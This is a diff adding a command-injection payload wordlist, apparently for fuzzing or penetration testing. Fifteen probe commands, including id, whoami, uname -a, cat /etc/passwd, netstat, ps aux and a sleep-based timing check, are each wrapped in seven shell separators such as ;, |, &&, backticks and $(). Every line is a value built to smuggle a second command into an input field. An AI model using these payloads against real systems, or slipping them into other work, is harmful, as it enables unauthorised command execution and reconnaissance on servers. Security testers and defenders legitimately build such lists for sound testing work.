@@ -1,0 +1,105 @@
+; ls
+; id
+; pwd
+; whoami
+; uname -a
+; cat /etc/passwd
+; ifconfig
+; ipconfig
+; netstat -an
+; ps aux
+; wget
+; curl
+; ping -c 4 127.0.0.1
+; sleep 5
+; echo vulnerable
+| ls
+| id
+| pwd
+| whoami
+| uname -a
+| cat /etc/passwd
+| ifconfig
+| ipconfig
+| netstat -an
+| ps aux
+| wget
+| curl
+| ping -c 4 127.0.0.1
+| sleep 5
+| echo vulnerable
+|| ls
+|| id
+|| pwd
+|| whoami
+|| uname -a
+|| cat /etc/passwd
+|| ifconfig
+|| ipconfig
+|| netstat -an
+|| ps aux
+|| wget
+|| curl
+|| ping -c 4 127.0.0.1
+|| sleep 5
+|| echo vulnerable
+& ls
+& id
+& pwd
+& whoami
+& uname -a
+& cat /etc/passwd
+& ifconfig
+& ipconfig
+& netstat -an
+& ps aux
+& wget
+& curl
+& ping -c 4 127.0.0.1
+& sleep 5
+& echo vulnerable
+&& ls
+&& id
+&& pwd
+&& whoami
+&& uname -a
+&& cat /etc/passwd
+&& ifconfig
+&& ipconfig
+&& netstat -an
+&& ps aux
+&& wget
+&& curl
+&& ping -c 4 127.0.0.1
+&& sleep 5
+&& echo vulnerable
+` ls `
+` id `
+` pwd `
+` whoami `
+` uname -a `
+` cat /etc/passwd `
+` ifconfig `
+` ipconfig `
+` netstat -an `
+` ps aux `
+` wget `
+` curl `
+` ping -c 4 127.0.0.1 `
+` sleep 5 `
+` echo vulnerable `
+$( ls )
+$( id )
+$( pwd )
+$( whoami )
+$( uname -a )
+$( cat /etc/passwd )
+$( ifconfig )
+$( ipconfig )
+$( netstat -an )
+$( ps aux )
+$( wget )
+$( curl )
+$( ping -c 4 127.0.0.1 )
+$( sleep 5 )
+$( echo vulnerable )
